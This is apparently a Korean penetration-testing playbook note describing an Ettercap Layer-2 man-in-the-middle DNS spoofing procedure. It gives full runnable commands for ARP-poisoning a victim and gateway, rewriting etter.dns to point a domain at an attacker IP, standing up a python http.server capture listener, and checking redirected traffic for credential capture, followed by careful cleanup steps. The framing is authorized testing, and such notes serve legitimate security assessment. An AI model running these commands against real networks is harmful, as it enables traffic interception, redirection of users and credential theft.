---
tags:
  - 서비스/dns
시작조건: ["동일 네트워크 또는 중간자 위치 확보", "대상 DNS 질의 관찰 가능"]
필요조건: ["동일 네트워크 또는 트래픽 중간자 위치", "대상 DNS 질의 관찰 가능", "조작할 도메인과 공격자 IP", "피해자가 조작된 응답을 사용"]
결과: ["L2 MITM DNS 응답 조작", "HTTP 트래픽 리디렉션", "자격 증명 수집 후보"]
---

# Ettercap L2 MITM DNS Spoofing

## 한 줄 판단

공격 호스트가 피해자와 게이트웨이와 같은 Layer 2 브로드캐스트 구간에 있고 패킷 전달과 ARP 변조에 필요한 관리자 권한이 있다면, Ettercap으로 중간자 위치를 만든 뒤 관찰한 DNS 질의에만 조작 응답을 보내 HTTP 연결이 통제한 호스트로 이동하는지 검증한다.

## 사용할 때

- 같은 L2 네트워크에 있고 ARP spoofing/MITM 위치를 확보할 수 있을 때.
- 피해자가 내부 DNS 또는 로컬 네트워크 응답을 신뢰하는 구조일 때.
- 특정 도메인 접속을 공격자 웹 서버나 캡처 지점으로 리디렉션해 영향도를 검증해야 할 때.
- 재귀 resolver cache 자체를 변조하는 cache poisoning 검증에는 이 문서를 사용하지 않는다.

## 전제 조건

| 조건 | 확인 방법 | 충족 기준 |
|---|---|---|
| 중간자 위치 | 네트워크 위치, ARP/MITM 가능성 | 피해자와 게이트웨이 사이 트래픽 관찰 가능 |
| 조작 대상 | 도메인, 내부 앱, 테스트 호스트 | 리디렉션할 FQDN 결정 |
| 수신 서비스 | 공격자 웹/캡처 서버 | 피해자 접속을 받을 준비 완료 |
| 검증 경로 | 브라우저, `nslookup`, 로그 | 피해자 DNS 결과 또는 접속 로그 확인 가능 |
| 도구 버전과 설정 경로 | `ettercap --version`, `ettercap -P list`, 설치 패키지의 `etter.dns` 위치 확인 | `dns_spoof`가 보이고 실제 설정 파일 경로를 `<ETTER_DNS_PATH>`로 기록 |

## 확인할 단서

| 단서 | 의미 | 다음 행동 |
|---|---|---|
| 피해자가 LLMNR/NBT-NS/DNS 질의 발생 | 이름 해석 경로 개입 가능성 | poisoning 도구와 수신 서비스 준비 |
| 대상이 HTTP 접속 | 콘텐츠 리디렉션 도달 여부 확인 가능 | 식별 가능한 테스트 페이지로 확인 |
| HTTPS/HSTS 사용 | 인증서 오류 또는 차단 가능성 | DNS spoofing 영향과 HTTPS 한계를 구분 |

## 실행

1. 인터페이스, 피해자 IP, 게이트웨이 IP, 공격 호스트의 `ip_forward`와 양 끝점의 원래 ARP·DNS 결과를 기록한다.
2. 설치된 `etter.dns` 경로와 기존 파일 hash를 확인하고, 충돌하지 않는 `<TASK_ID>` 표시와 백업 경로를 정해 조작할 도메인 하나만 추가한다.
3. 식별 가능한 HTTP 수신 페이지를 준비하고 새 listener PID를 기록한다.
4. 피해자와 게이트웨이 사이에서 ARP MITM과 `dns_spoof`를 함께 실행하고 새 Ettercap PID를 기록한다.
5. 피해자 이름 해석 결과와 공격자 HTTP 로그를 확인한다.
6. Ettercap을 정상 종료한 뒤 원격 ARP·DNS 복귀를 확인하고, 공격 호스트의 DNS 규칙·`ip_forward`와 수신 서비스를 원복한다.

### 명령과 확인할 출력

#### 변경 전 상태와 Ettercap DNS 규칙

```bash
ettercap --version
ettercap -P list
sudo pgrep -a -x ettercap
ip neigh show dev <INTERFACE>
sysctl -n net.ipv4.ip_forward
test ! -e <ETTER_DNS_BACKUP>
sudo cp -a <ETTER_DNS_PATH> <ETTER_DNS_BACKUP>
sudo sha256sum <ETTER_DNS_PATH> <ETTER_DNS_BACKUP>
```

Linux 패키지는 보통 `/etc/ettercap/etter.dns`를 사용하지만 source 설치나 비-Linux 빌드는 `/usr/local/etc/ettercap` 등 다른 경로를 사용할 수 있다. 실행 전에 설치된 버전과 실제 파일을 확인한다. `ip_forward` 값은 `<IP_FORWARD_BEFORE>`로, 원본 hash는 `<ETTER_DNS_BEFORE_SHA256>`로 기록하되 Vault에 작업 로그를 저장하지 않는다.

예시 규칙:

```text
# BEGIN <TASK_ID>
<DOMAIN> A <ATTACKER_IP>
*.<DOMAIN> A <ATTACKER_IP>
# END <TASK_ID>
```

```bash
sudoedit <ETTER_DNS_PATH>
sudo sha256sum <ETTER_DNS_PATH>
```

확인할 출력:

- 조작 대상 도메인과 공격자 IP가 정확히 매핑되어 있는지 확인한다. 기존 동일 규칙이 있으면 추가하지 않고, 편집 후 hash를 `<ETTER_DNS_TASK_SHA256>`로 기록한다.

#### 수신 웹 서버 준비

```bash
test ! -e <HTTP_LOG>
python3 -m http.server <HTTP_PORT> --bind <ATTACKER_IP> --directory <WEB_ROOT> > <HTTP_LOG> 2>&1 &
HTTP_PID=$!
ps -p "$HTTP_PID" -o pid=,lstart=,args=
```

확인할 출력:

- 기록한 새 `<HTTP_PID>`가 `<ATTACKER_IP>:<HTTP_PORT>`에서 대기하고 피해자 접속 시 `<HTTP_LOG>`에 요청이 찍힌다. 피해자가 `http://<DOMAIN>/`으로 접속하면 `<HTTP_PORT>`는 80이어야 하며, 다른 포트는 URL에 그 포트가 포함된 경우에만 도달한다.

#### Ettercap L2 MITM과 DNS spoofing

```bash
sudo ettercap -T -q -i <INTERFACE> -M arp:remote /<VICTIM_IP>// /<GATEWAY_IP>// -P dns_spoof &
ETTERCAP_LAUNCH_PID=$!
sudo pgrep -a -x ettercap
sudo ps -p <ETTERCAP_PID> -o pid=,ppid=,lstart=,args=
```

확인할 출력:

- 실행 전 목록에 없고 정확한 interface·target 인자가 일치하는 새 프로세스를 `<ETTERCAP_PID>`로 기록한다. `$ETTERCAP_LAUNCH_PID`는 `sudo` wrapper일 수 있으므로 정리 대상을 대신하지 않는다.
- 기록한 새 `<ETTERCAP_PID>`에서 피해자·게이트웨이에 대한 ARP poisoning 시작.
- `<DOMAIN>` 질의를 확인하고 공격자 IP를 담은 spoofed DNS 응답 전송.
- `remote`는 피해자의 게이트웨이 너머 트래픽을 중계해야 할 때 사용한다. 명령의 두 target을 비우면 LAN 전체로 넓어지므로 이 절차에서는 사용하지 않는다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 피해자 시스템에서 대상 도메인이 공격자 IP로 해석됨 | L2 MITM 경로의 조작 DNS 응답 사용 확인 | L2 MITM DNS 응답 조작 | HTTP 접속과 공격자 수신 로그 확인 후 원복 |
| 피해자가 대상 도메인 접속 시 공격자 웹 서버 로그가 남음 | 애플리케이션 트래픽이 공격자에게 도달함 | HTTP 트래픽 리디렉션 | 원복 후 [[웹 서비스 발견 후 Foothold 확보]]에서 Host·경로 재평가 |
| 인증 요청이 수신 지점에 실제 도달함 | 인증 트래픽 수집 가능성은 있으나 credential 유효성은 미확인 | 자격 증명 수집 후보 | 원복 후 [[네트워크 트래픽 자격증명 수집]], 유효 credential이면 [[확보한 자격 증명으로 원격 접근 경로 선택]] |
| DNS 결과가 바뀌지 않음 | MITM 위치 미확보, DNS over HTTPS, 고정 DNS | 시작 상태 유지 | 네트워크 위치, resolver, 캐시 상태 확인 |
| HTTP 로그 없음 | 피해자가 접속하지 않음, 방화벽 차단 | 시작 상태 유지 | 대상 도메인, 라우팅, 웹 서버 포트 확인 |
| HTTPS 경고 | 인증서 불일치, HSTS | 시작 상태 유지 | HTTP 리디렉션과 HTTPS 인증서 한계를 구분 |
| 캐시 때문에 반영 지연 | 피해자 로컬 cache가 기존 응답 사용 | 시작 상태 유지 | TTL과 피해자 로컬 cache 상태 확인 |
| resolver cache 자체의 변조가 의심됨 | Ettercap L2 spoofing과 다른 검증 대상 | 이 문서 범위 밖 | cache poisoning으로 단정하지 않고 별도 resolver 조건 확인 |

## 확인할 출력과 권한

- 판정 기준: 피해자의 이름 해석 결과와 공격자 수신 로그를 함께 확인하고, HTTP 리디렉션과 HTTPS 인증서 한계를 구분한다.
- 권한 구분: 인증 전·익명·유효 계정 상태를 구분하고, 서비스 응답만으로 실제 권한을 추정하지 않는다.

## 변경 영향과 복구

변경 항목은 `etter.dns`의 `<TASK_ID>` 블록, 공격 호스트의 `ip_forward`, `<ETTERCAP_PID>` ARP MITM·DNS spoofing 프로세스, `<HTTP_PID>` listener와 `<HTTP_LOG>`, 피해자·게이트웨이의 ARP cache다. 연결이 살아 있을 때 피해자 기준 결과를 기록한 뒤 다음 순서로 정리한다.

### 1. MITM 종료와 원격 복귀 확인

```bash
sudo kill -INT <ETTERCAP_PID>
ps -p <ETTERCAP_PID> -o pid=,args=
```

- `SIGINT`로 정상 종료하고 프로세스가 사라졌는지 확인한다. `kill -9`나 이름 기반 일괄 종료는 정상 종료 처리를 건너뛰고 다른 실행까지 종료할 수 있으므로 사용하지 않는다.
- 피해자와 게이트웨이에서 각자 `arp -a` 또는 `ip neigh`로 상대의 정상 MAC을 확인하고, 피해자에서 `<DOMAIN>`을 다시 조회해 원래 DNS 결과인지 확인한다. 공격 호스트의 `ip neigh`만으로 두 원격 cache 복귀를 확정하지 않는다.
- 원격 확인 경로가 이미 끊겼다면 Ettercap 종료까지만 확인하고 ARP·DNS 복구는 `미확인`으로 남긴다. cache 만료를 원상복구 완료로 단정하지 않는다.

### 2. 공격 호스트 설정과 listener 정리

```bash
sudo sha256sum <ETTER_DNS_PATH>
sudo cp -a <ETTER_DNS_BACKUP> <ETTER_DNS_PATH>
sudo cmp -s <ETTER_DNS_PATH> <ETTER_DNS_BACKUP>
sudo rm -- <ETTER_DNS_BACKUP>
sudo sysctl -w net.ipv4.ip_forward=<IP_FORWARD_BEFORE>
kill <HTTP_PID>
ps -p <HTTP_PID> -o pid=,args=
ss -lntp
rm -- <HTTP_LOG>
test ! -e <HTTP_LOG>
```

- 현재 설정 hash가 `<ETTER_DNS_TASK_SHA256>`와 같을 때만 백업 전체를 복원한다. 다른 변경이 섞였으면 전체를 덮어쓰지 말고 `sudoedit <ETTER_DNS_PATH>`로 `<TASK_ID>` 블록만 제거한 뒤 원본 내용과 대조한다.
- Ettercap은 unified sniffing을 시작할 때 kernel IP forwarding을 변경할 수 있고, 공격 호스트가 gateway이면 종료 후 원래 값을 자동 복원하지 못할 수 있다. 기록한 `<IP_FORWARD_BEFORE>` 값으로만 되돌리고 `sysctl -n net.ipv4.ip_forward`로 확인한다.
- `<HTTP_PID>`만 종료하고 `ss -lntp`에서 해당 PID와 `<HTTP_PORT>` listener가 사라졌는지 확인한다. 프로세스가 이미 없으면 이름으로 다른 Python을 종료하지 말고 포트의 실제 소유자를 확인한다. `<HTTP_LOG>`는 승인된 작업 저장소로 먼저 옮겨야 하는 증적이 아니라면 exact 경로만 제거하며 Vault에 넣지 않는다.

## 관련 상태 라우터

- 리디렉션된 HTTP 기능 재평가: [[웹 서비스 발견 후 Foothold 확보]]
- credential 후보 수집: [[확보한 자격 증명으로 원격 접근 경로 선택]]
- L2 위치 또는 내부 경로 재평가: [[내부망 경로 확보 후 피벗 구성]]

## 관련 서비스

- [[DNS 서비스]]
- [[HTTP와 HTTPS 서비스]]

## 관련 도구

- [[ettercap]]

## 관련 노트

- [[네트워크 트래픽 자격증명 수집]]
- [[DNS 열거와 Zone Transfer]]

## 참고 링크

- [Ettercap manual](https://github.com/Ettercap/ettercap/blob/master/man/ettercap.8.in)
- [Ettercap dns_spoof rule format](https://github.com/Ettercap/ettercap/blob/master/share/etter.dns)
